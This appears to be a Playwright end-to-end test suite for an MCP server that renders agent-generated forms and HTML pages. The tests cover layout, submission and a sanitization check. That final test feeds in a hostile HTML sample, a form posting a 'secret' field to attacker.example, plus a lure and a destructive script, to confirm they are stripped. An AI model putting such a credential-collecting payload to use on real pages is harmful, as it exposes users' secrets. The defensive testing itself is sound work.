import { expect, test } from '@playwright/test';
import type { Page } from '@playwright/test';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import {
  getDefaultEnvironment,
  StdioClientTransport,
} from '@modelcontextprotocol/sdk/client/stdio.js';
import { z } from 'zod';

const apiUrl = process.env.E2E_API_URL ?? 'http://127.0.0.1:8787';
const webUrl = process.env.E2E_WEB_URL ?? 'http://127.0.0.1:8788';

const createdPageSchema = z.object({
  structuredContent: z.object({
    page_id: z.string().regex(/^[a-f0-9]{32}$/),
    url: z.string().url(),
    expires_at: z.number(),
  }),
});

const resultSchema = z.object({
  structuredContent: z.object({
    page_id: z.string(),
    state: z.enum(['open', 'submitted', 'received']),
    format: z.enum(['a2ui', 'html']),
    result: z.unknown().nullable(),
  }),
});

async function expectDemoDashboardFitsPreview(page: Page) {
  const iframe = page.locator('pagent-demo iframe');
  await expect(iframe).toHaveAttribute('sandbox', '');

  const dashboard = iframe.contentFrame();
  await expect(dashboard.getByText('96%')).toBeVisible();
  await expect(dashboard.locator('.bar')).toHaveCount(6);

  const layout = await dashboard.locator('html').evaluate((root) => {
    const chart = root.querySelector('.bars');
    const lastMetric = root.querySelector('.stat:last-child');
    if (!(chart instanceof HTMLElement) || !(lastMetric instanceof HTMLElement)) {
      throw new TypeError('Expected the demo dashboard chart and final metric');
    }
    return {
      viewportHeight: window.innerHeight,
      documentHeight: root.scrollHeight,
      chartBottom: chart.getBoundingClientRect().bottom,
      lastMetricBottom: lastMetric.getBoundingClientRect().bottom,
    };
  });

  expect(layout.documentHeight).toBeLessThanOrEqual(layout.viewportHeight);
  expect(layout.chartBottom).toBeLessThanOrEqual(layout.viewportHeight);
  expect(layout.lastMetricBottom).toBeLessThanOrEqual(layout.viewportHeight);
}

const testSpec = [
  {
    version: 'v0.9',
    createSurface: {
      surfaceId: 'e2e',
      catalogId: 'https://a2ui.org/specification/v0_9/basic_catalog.json',
    },
  },
  {
    version: 'v0.9',
    updateComponents: {
      surfaceId: 'e2e',
      components: [
        { id: 'root', component: 'Column', children: ['title', 'name', 'project', 'submit'] },
        { id: 'title', component: 'Text', text: 'Production E2E form' },
        { id: 'name', component: 'TextField', label: 'Your name', value: { path: '/name' } },
        {
          id: 'project',
          component: 'TextField',
          label: 'What are you building?',
          value: { path: '/project' },
        },
        { id: 'submit-label', component: 'Text', text: 'Submit' },
        {
          id: 'submit',
          component: 'Button',
          child: 'submit-label',
          variant: 'primary',
          action: {
            event: {
              name: 'submitted',
              context: { name: { path: '/name' }, project: { path: '/project' } },
            },
          },
        },
      ],
    },
  },
];

async function connectStdioClient(): Promise<Client> {
  const client = new Client({ name: 'pagent-e2e', version: '0.0.1' });
  await client.connect(
    new StdioClientTransport({
      command: process.execPath,
      args: ['apps/mcp/server.bundle.js'],
      cwd: process.cwd(),
      env: { ...getDefaultEnvironment(), PAGENT_URL: apiUrl },
      stderr: 'pipe',
    }),
  );
  return client;
}

test('production API and SPA expose their public entry points', async ({ page, request }) => {
  const health = await request.get(`${apiUrl}/health`);
  expect(health.status()).toBe(200);
  await expect(health.json()).resolves.toMatchObject({ ok: true });

  await page.goto('/');
  await expect(page).toHaveTitle(/Pagent/i);
  await expect(page.getByRole('link', { name: /live demo/i }).first()).toBeVisible();

  await page.goto('/demo');
  await expect(
    page.getByRole('heading', { name: /See what your agent can show you/i }),
  ).toBeVisible();
  await page.getByLabel('Your name').fill('Ada');
  await page.getByLabel('What are you building?').fill('Production readiness');
  await page.getByRole('button', { name: 'Submit' }).click();
  await expect(page.getByText('Your agent would receive')).toBeVisible();
  await expect(page.getByText(/Production readiness/)).toBeVisible();
});

test('demo dashboard keeps every metric and chart bar visible at desktop and mobile widths', async ({
  page,
}) => {
  for (const viewport of [
    { width: 1440, height: 1000 },
    { width: 390, height: 844 },
  ]) {
    await page.setViewportSize(viewport);
    await page.goto('/demo');
    await expectDemoDashboardFitsPreview(page);
  }
});

test('generated text stays within a 320px viewport for long identifiers and CJK copy', async ({
  page,
}) => {
  const longIdentifier = `RELEASE_CANDIDATE_${'A'.repeat(96)}`;
  const cjkCopy =
    'これは読みやすく自然に改行される日本語の文章です。这个中文句子应该自然换行而不溢出屏幕。';
  const spec = [
    {
      version: 'v0.9',
      createSurface: {
        surfaceId: 'narrow-text',
        catalogId: 'https://a2ui.org/specification/v0_9/basic_catalog.json',
      },
    },
    {
      version: 'v0.9',
      updateComponents: {
        surfaceId: 'narrow-text',
        components: [
          { id: 'root', component: 'Column', children: ['identifier', 'cjk'] },
          { id: 'identifier', component: 'Text', text: longIdentifier },
          { id: 'cjk', component: 'Text', text: cjkCopy },
        ],
      },
    },
  ];
  const client = await connectStdioClient();
  try {
    const created = createdPageSchema.parse(
      await client.callTool({ name: 'show_ui', arguments: { spec } }),
    );
    await page.setViewportSize({ width: 320, height: 720 });
    await page.goto(created.structuredContent.url);
    await expect(page.getByText(longIdentifier)).toBeVisible();
    await expect(page.getByText(cjkCopy)).toBeVisible();

    const layout = await page.evaluate(() => ({
      viewportWidth: window.innerWidth,
      documentWidth: document.documentElement.scrollWidth,
    }));
    expect(layout.documentWidth).toBeLessThanOrEqual(layout.viewportWidth);

    for (const text of [longIdentifier, cjkCopy]) {
      const box = await page.getByText(text).boundingBox();
      expect(box).not.toBeNull();
      if (box === null) throw new TypeError(`Could not measure generated text: ${text}`);
      expect(box.x).toBeGreaterThanOrEqual(0);
      expect(box.x + box.width).toBeLessThanOrEqual(layout.viewportWidth);
    }
  } finally {
    await client.close();
  }
});

test('generated tabs and modal fit a 320px viewport', async ({ page }) => {
  const longTabTitle = `ACCOUNT_${'SETTINGS_'.repeat(12)}`;
  const spec = [
    {
      version: 'v0.9',
      createSurface: {
        surfaceId: 'narrow-components',
        catalogId: 'https://a2ui.org/specification/v0_9/basic_catalog.json',
      },
    },
    {
      version: 'v0.9',
      updateComponents: {
        surfaceId: 'narrow-components',
        components: [
          { id: 'root', component: 'Column', children: ['tabs', 'modal'] },
          {
            id: 'tabs',
            component: 'Tabs',
            tabs: [
              { title: longTabTitle, child: 'first-panel' },
              { title: 'Notifications', child: 'second-panel' },
            ],
          },
          { id: 'first-panel', component: 'Text', text: 'Account settings' },
          { id: 'second-panel', component: 'Text', text: 'Notification settings' },
          { id: 'modal', component: 'Modal', trigger: 'open-modal', content: 'modal-content' },
          { id: 'open-modal', component: 'Button', child: 'open-modal-label' },
          { id: 'open-modal-label', component: 'Text', text: 'Open narrow modal' },
          {
            id: 'modal-content',
            component: 'Text',
            text: `DETAIL_${'WITHOUT_BREAKS_'.repeat(12)}`,
          },
        ],
      },
    },
  ];
  const client = await connectStdioClient();
  try {
    const created = createdPageSchema.parse(
      await client.callTool({ name: 'show_ui', arguments: { spec } }),
    );
    await page.setViewportSize({ width: 320, height: 720 });
    await page.goto(created.structuredContent.url);

    const longTab = page.getByRole('button', { name: longTabTitle });
    await expect(longTab).toBeVisible();
    const tabBox = await longTab.boundingBox();
    expect(tabBox).not.toBeNull();
    if (tabBox === null) throw new TypeError('Could not measure the long tab');
    expect(tabBox.x).toBeGreaterThanOrEqual(0);
    expect(tabBox.x + tabBox.width).toBeLessThanOrEqual(320);

    await page.getByRole('button', { name: 'Open narrow modal' }).click();
    const dialog = page.locator('a2ui-modal dialog');
    await expect(dialog).toBeVisible();
    const dialogBox = await dialog.boundingBox();
    expect(dialogBox).not.toBeNull();
    if (dialogBox === null) throw new TypeError('Could not measure the modal dialog');
    expect(dialogBox.x).toBeGreaterThanOrEqual(0);
    expect(dialogBox.x + dialogBox.width).toBeLessThanOrEqual(320);

    const layout = await page.evaluate(() => ({
      viewportWidth: window.innerWidth,
      documentWidth: document.documentElement.scrollWidth,
    }));
    expect(layout.documentWidth).toBeLessThanOrEqual(layout.viewportWidth);
  } finally {
    await client.close();
  }
});

test('stdio MCP creates a page, the browser submits it, and the agent receives it', async ({
  page,
}) => {
  const client = await connectStdioClient();
  try {
    const created = createdPageSchema.parse(
      await client.callTool({ name: 'show_ui', arguments: { spec: testSpec } }),
    );
    expect(created.structuredContent.url).toBe(`${webUrl}/${created.structuredContent.page_id}`);

    await page.goto(created.structuredContent.url);
    await expect(page.getByText('Production E2E form')).toBeVisible();
    await page.getByLabel('Your name').fill('Ada');
    await page.getByLabel('What are you building?').fill('A reliable agent UI');

    const submitted = page.waitForResponse(
      (response) => response.url().endsWith('/result') && response.request().method() === 'POST',
    );
    await page.getByRole('button', { name: 'Submit' }).click();
    expect((await submitted).status()).toBe(200);
    await expect(page.getByRole('status')).toContainText(/waiting for the agent/i);
    const a2uiHost = page.locator('.a2ui-host');
    const nameField = page.getByLabel('Your name');
    await expect(a2uiHost).toHaveAttribute('inert', '');
    const acceptedFocus = await nameField.evaluate((element) => {
      if (!(element instanceof HTMLElement)) throw new TypeError('Expected an HTML form control');
      element.focus();
      return element.matches(':focus');
    });
    expect(acceptedFocus).toBe(false);
    await page.keyboard.type('Mallory');
    await expect(nameField).toHaveValue('Ada');

    const result = resultSchema.parse(
      await client.callTool({
        name: 'check_result',
        arguments: { page_id: created.structuredContent.page_id },
      }),
    );
    expect(result.structuredContent).toMatchObject({
      state: 'submitted',
      format: 'a2ui',
      result: {
        name: 'submitted',
        surfaceId: 'e2e',
        context: { name: 'Ada', project: 'A reliable agent UI' },
      },
    });
    await expect(page.getByRole('status')).toContainText('The agent has your input', {
      timeout: 5_000,
    });
    await expect(page.locator('.awaiting-banner .small-spinner')).toHaveCount(0);
    await expect(
      page.locator('.awaiting-banner .material-symbols', { hasText: 'check_circle' }),
    ).toBeVisible();
    await expect(a2uiHost).toHaveAttribute('inert', '');
  } finally {
    await client.close();
  }
});

test('stdio MCP serves a sanitized view-only HTML page', async ({ page }) => {
  const client = await connectStdioClient();
  try {
    const created = createdPageSchema.parse(
      await client.callTool({
        name: 'show_html',
        arguments: {
          html: '<main><h1>Live production view</h1><form action="https://attacker.example/collect"><label>Secret <input name="secret"></label><button>Send</button></form><div contenteditable="true">Editable lure</div><script>document.body.remove()</script></main>',
        },
      }),
    );
    await page.goto(created.structuredContent.url);

    const iframe = page.locator('iframe');
    await expect(iframe).toHaveAttribute('sandbox', '');
    await expect(
      iframe.contentFrame().getByRole('heading', { name: 'Live production view' }),
    ).toBeVisible();
    expect(await iframe.contentFrame().locator('script').count()).toBe(0);
    expect(
      await iframe.contentFrame().locator('form, input, button, [contenteditable]').count(),
    ).toBe(0);

    const result = resultSchema.parse(
      await client.callTool({
        name: 'check_result',
        arguments: { page_id: created.structuredContent.page_id },
      }),
    );
    expect(result.structuredContent).toMatchObject({
      state: 'open',
      format: 'html',
      result: null,
    });
  } finally {
    await client.close();
  }
});
